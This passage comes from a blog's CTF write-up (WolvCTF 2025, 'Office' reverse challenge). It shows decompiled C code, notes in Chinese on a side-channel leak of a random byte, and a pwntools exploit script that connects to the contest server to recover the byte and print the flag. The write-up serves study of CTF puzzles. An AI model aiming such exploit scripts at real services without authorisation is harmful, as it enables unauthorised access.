class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t even spend money and yet you lost it all. You&#x27;re fired.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;choice: %d\n&quot;</span>, v4);</span><br><span class="line">  <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>選單題，1 是賺錢 2是改薪水 3是退出+檢查值拿 Flag，另外剛開始會 sleep 就是避免爆破<br>先來看 3 的功能：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">sub_4013E3</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> ptr[<span class="number">56</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">257</span> * (<span class="type">unsigned</span> __int8)byte_4040A9 == balence_default_1337 )</span><br><span class="line">  &#123;</span><br><span class="line">    stream = fopen(<span class="string">&quot;./flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Cannot open ./flag.txt&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fread(ptr, <span class="number">0x20</span>uLL, <span class="number">1uLL</span>, stream);</span><br><span class="line">    ptr[<span class="number">32</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You were actually nice to have around&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Here, take this parting gift:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(ptr);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good riddance&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果 257*一開始的urandom值 &#x3D; 我最後的錢就給我 flag，我能改薪水所以理論上，只要拿到 urandom 值就結束了  </p>
<p>再來是最重要的 function 1：<br>他對一個初始化時跟一開始的 urandom 的值一樣的變數進行了 side channel leak 和 xor  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_4011C6</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="type">unsigned</span> __int8)urandom_byte &amp; (<span class="type">unsigned</span> __int8)byte_404088) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You forget to put the cover sheet on your TPS report&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="type">unsigned</span> __int8)urandom_byte &amp; (<span class="type">unsigned</span> __int8)byte_404089) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You have a meeting with a consultant&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="type">unsigned</span> __int8)urandom_byte &amp; (<span class="type">unsigned</span> __int8)byte_40408A) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The printer jams&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="type">unsigned</span> __int8)urandom_byte &amp; (<span class="type">unsigned</span> __int8)byte_40408B) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your boss tells you that you have to come in on Saturday&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="type">unsigned</span> __int8)urandom_byte &amp; (<span class="type">unsigned</span> __int8)byte_40408C) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The fire alarm goes off&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="type">unsigned</span> __int8)urandom_byte &amp; (<span class="type">unsigned</span> __int8)byte_40408D) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your cowworker asks if you have seen his stapler&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="type">unsigned</span> __int8)urandom_byte &amp; (<span class="type">unsigned</span> __int8)byte_40408E) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You think about quitting&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Time to clock out. You made $%d today\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)earn);</span><br><span class="line">  balence_default_1337 += earn;</span><br><span class="line">  result = balence_default_1337 ^ (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="type">unsigned</span> __int8)urandom_byte;</span><br><span class="line">  urandom_byte ^= balence_default_1337;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以從交錯的判斷條件拿到當前的數字可能是什麼，剩下就是不斷追蹤每一種可能，直到過濾到剩一種就能推原本的urandomㄌ，<del>有很大的機率會篩不出來所以我刮刮樂了一陣子</del>，其實應該要能透過調整薪水的值去構造某種類 oracle 但我決定多跑幾次w<br><strong>exp.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;office.kctf-453514-codelab.kctf.cloud&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">masks=[<span class="number">10</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">168</span>, <span class="number">96</span>, <span class="number">1</span>]</span><br><span class="line">sentences=[</span><br><span class="line"><span class="string">&quot;You forget to put the cover sheet on your TPS report&quot;</span>,</span><br><span class="line"><span class="string">&quot;You have a meeting with a consultant&quot;</span>,</span><br><span class="line"><span class="string">&quot;The printer jams&quot;</span>,</span><br><span class="line"><span class="string">&quot;Your boss tells you that you have to come in on Saturday&quot;</span>,</span><br><span class="line"><span class="string">&quot;The fire alarm goes off&quot;</span>,</span><br><span class="line"><span class="string">&quot;Your cowworker asks if you have seen his stapler&quot;</span>,</span><br><span class="line"><span class="string">&quot;You think about quitting&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">origin_byte=<span class="number">0</span></span><br><span class="line">possible=[x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">xored_possible=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> possible:</span><br><span class="line">    xored_possible[i]=i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">x</span>):</span><br><span class="line">    can=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        yes=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">            <span class="keyword">if</span> i&amp;masks[j]!=<span class="number">0</span> <span class="keyword">and</span> x[j]==<span class="number">0</span>:</span><br><span class="line">                yes=<span class="literal">False</span></span><br><span class="line">            <span class="keyword">elif</span> i&amp;masks[j]==<span class="number">0</span> <span class="keyword">and</span> x[j]!=<span class="number">0</span>:</span><br><span class="line">                yes=<span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> yes==<span class="literal">True</span>:</span><br><span class="line">            can.append(i)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> can</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">state</span>):</span><br><span class="line">    cur=[<span class="number">0</span>]*<span class="number">7</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">if</span> sentences[i].encode() <span class="keyword">in</span> state:</span><br><span class="line">            cur[i]=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(cur)</span><br><span class="line">    <span class="keyword">return</span> test(cur)</span><br><span class="line">    </span><br><span class="line">cur_value=<span class="number">1337</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(possible)!=<span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(possible)==<span class="number">0</span>:</span><br><span class="line">        exit(<span class="string">f&#x27;WTF <span class="subst">&#123;cur_value&#125;</span>&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    cur_value+=<span class="number">10</span></span><br><span class="line">    state=r.recvuntil(<span class="string">b&#x27;Time to clock out. You made $10 today&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> check(state):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> possible:</span><br><span class="line">            <span class="keyword">if</span> xored_possible[j] <span class="keyword">not</span> <span class="keyword">in</span> check(state):</span><br><span class="line">                possible.remove(j)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                xored_possible[j]=(xored_possible[j]^cur_value)%<span class="number">256</span></span><br><span class="line">    <span class="built_in">print</span>(possible, r.recv())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">257</span>*possible[<span class="number">0</span>]-cur_value).encode())</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#r.recv()</span></span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/Sk1gmL0nkg.png" alt="image">  </p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensics"><span class="toc-number">2.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Active-1-Domain-Access"><span class="toc-number">2.1.</span> <span class="toc-text">Active 1: Domain Access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Active-2-Lateral-Movement"><span class="toc-number">2.2.</span> <span class="toc-text">Active 2: Lateral Movement</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Active-3-Domain-Admin"><span class="toc-number">2.3.</span> <span class="toc-text">Active 3: Domain Admin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Limited-1"><span class="toc-number">3.1.</span> <span class="toc-text">Limited 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Limited-2"><span class="toc-number">3.2.</span> <span class="toc-text">Limited 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Limited-3"><span class="toc-number">3.3.</span> <span class="toc-text">Limited 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Art-Contest"><span class="toc-number">3.4.</span> <span class="toc-text">Art Contest</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ECB"><span class="toc-number">4.1.</span> <span class="toc-text">ECB++</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">5.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Office"><span class="toc-number">5.1.</span> <span class="toc-text">Office</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/03/24/wolvctf-2025/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/03/24/wolvctf-2025/&text=WolvCTF 2025 Write Up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/03/24/wolvctf-2025/&title=WolvCTF 2025 Write Up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/03/24/wolvctf-2025/&is_video=false&description=WolvCTF 2025 Write Up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=WolvCTF 2025 Write Up&body=Check out this article: http://wha13.github.io/2025/03/24/wolvctf-2025/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/03/24/wolvctf-2025/&title=WolvCTF 2025 Write Up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/03/24/wolvctf-2025/&title=WolvCTF 2025 Write Up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/03/24/wolvctf-2025/&title=WolvCTF 2025 Write Up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/03/24/wolvctf-2025/&title=WolvCTF 2025 Write Up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/03/24/wolvctf-2025/&name=WolvCTF 2025 Write Up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/03/24/wolvctf-2025/&t=WolvCTF 2025 Write Up"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    William Lin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
